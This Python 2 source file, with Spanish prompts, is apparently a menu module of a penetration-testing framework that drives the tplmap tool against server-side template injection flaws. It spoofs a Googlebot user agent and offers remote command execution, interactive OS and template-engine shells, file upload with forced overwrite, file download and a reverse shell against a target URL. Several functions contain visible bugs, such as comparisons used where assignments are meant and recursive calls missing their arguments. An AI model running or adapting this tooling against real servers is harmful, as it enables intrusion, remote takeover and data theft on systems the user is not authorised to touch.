#!/usr/bin/python2
# encoding: utf-8
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
import subprocess
import checker
import sqlimod

global useragent
useragent=str('Googlebot/2.1 (+http://www.googlebot.com/bot.html)')
def normalssti():
    global mode,ssitarget,level
    mode = "normal"
    ssitarget=sqlimod.urlglob()
    level=sqlimod.lev()
    ssitarget=str(ssitarget)
    injected=subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level])
    if injected==0:
        postssti()
    else:
        print ""
        cRojo("Ha ocurrido un error, por favor intentalo de nuevo.")
        submenu()



def sstipost():
    global ssitarget,mode,ssipost,level
    mode = "post"
    ssitarget=raw_input("introduce la url vulnerable: ")
    if ssitarget != "" and "." in ssitarget:
        ssipost=sqlimod.postglob()
        level=sqlimod.lev()
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level])

    else:
        checker.cRojo("La URL esta vacia o no es valida, intentalo de nuevo.\n")
        sstipost()

def remotecommand(mode):
    command=raw_input("Ingresa el comando que deseas ejecutar en el sistema remoto: ")
    if command != "" and mode == "normal":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--os-cmd="+command])
    elif command != "" and mode == "post":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--os-cmd="+command])
    else:
        checker.cRojo("Ha ocurrido un error, intentadolo de nuevo.\n")
        remotecommand()

def osshell(mode):
    if mode == "normal":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--os-shell"])
    elif mode == "post":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--os-shell"])
    else:
        checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
        osshell()

def localtoremote(mode,force):
    ruta=raw_input("Introduce la ruta del archivo local (Ej. /home/user/test.py): ")
    if ruta != "" and "/" in ruta and mode == "normal" and force == "no":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--upload="+ruta])
    elif ruta != "" and "/" in ruta and mode == "post" and force == "no":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--upload="+ruta])
    elif ruta != "" and "/" in ruta and mode == "normal" and force == "si":
        subprocess.call(["python2","modules/tplmap/tplmap.py","--force-overwrite","-A",useragent,"-u",ssitarget,"--level",level,"--upload="+ruta])
    elif ruta != "" and "/" in ruta and mode == "post" and force == "si":
        subprocess.call(["python2","modules/tplmap/tplmap.py","--force-overwrite","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--upload="+ruta])
    else:
        checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
        localtoremote()

def downfiles(mode):
    ruta=raw_input("Introduce la ruta del archivo que deseas descargar (Ej. /maquina/remota/mysql.db): ")
    if ruta != "" and "/" in ruta and mode == "normal":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--download="+ruta])
    elif ruta != "" and "/" in ruta and mode == "post":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--download="+ruta])
    else:
        checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
        downfiles()
        
def reverseshell(mode):
    host="127.0.0.1"
    port=raw_input("Introduce el puerto local al que deseas conectar la Bind Shell: ")
    if port != "" and mode == "normal":
         subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--reverse-shell"+host+port])
    elif port != "" and mode == "post":
        subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--reverse-shell"+host+port])
    else:
        checker.cRojo("Ha ocurrido un error, intentandolo de nuevo.\n")
        reverseshell()
    
def templateshell(mode):
    try:
        checker.cAmarillo("Intentando establecer una shell con el Template Engine...")
        if mode == "normal":
            subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--level",level,"--tpl-shell"])
        elif mode == "post":
            subprocess.call(["python2","modules/tplmap/tplmap.py","-A",useragent,"-u",ssitarget,"--data",ssipost,"--level",level,"--tpl-shell"])
        else:
            checker.cRojo("Ha ocurrido un error.")
    except:
        checker.cRojo("Ha ocurrido un error, intentando nuevamente.")
        templateshell()
            

def postssti():
    print """

Elija una de las siguientes opciones *SOLO* en caso de que se hayan detectado parametros vulnerables, de lo contrario elija 'Regresar al menú anterior.'
    
    * Opciones de interacción con el sistema operativo.

    a) Ejecutar un comnado de manera remota.
    b) Acceso a CMD en Sistemas Windows o Bash en GNU/Linux (Obtener una Shell interactiva).
    c) Subir archivos locales al Sistema remoto.
    d) Subir archivos locales al Sistema remoto forzando sobreescritura de archivos.
    e) Descargar archivos remotos al sistema local.
    f) Iniciar una shell en el sistema remoto y devolver la conexión al host y puerto local.

    * Opciones de interacción con el Template Engine (Motor de Plantilla)

    g) Obtener una shell interactiva del Template Engine.
    h) Regresar al menú anterior

    """

    option=raw_input("Teclea la opción: ")
    if option == "a":
        remotecommand(mode)
    elif option == "b":
        osshell(mode)
    elif option == "c":
        force=="no"
        localtoremote(mode,force)
    elif option == "d":
        force == "si"
        localtoremote(mode,force)
    elif option == "e":
        downfiles(mode)
    elif option == "f":
        reverseshell(mode)
    elif option == "g":
        templateshell(mode)
    elif option == "h":
        pass
        

def submenu():
    print """

Elige el método que vas a utilizar para la Server Side Template Inyection
    
    a) Metodo normal.
    b) Metodo post.
    c) Regresar al menú anterior
"""
    option1=raw_input("Introduce tu opción: ")
    if option1 == "a":
        normalssti()
    elif option1 == "b":
        sstipost()
        postssti()
    elif option1 == "c":
        print "Saliendo."
        pass
    else:
        checker.cRojo("Opción inválida, intentelo de nuevo.")
        submenu()
                
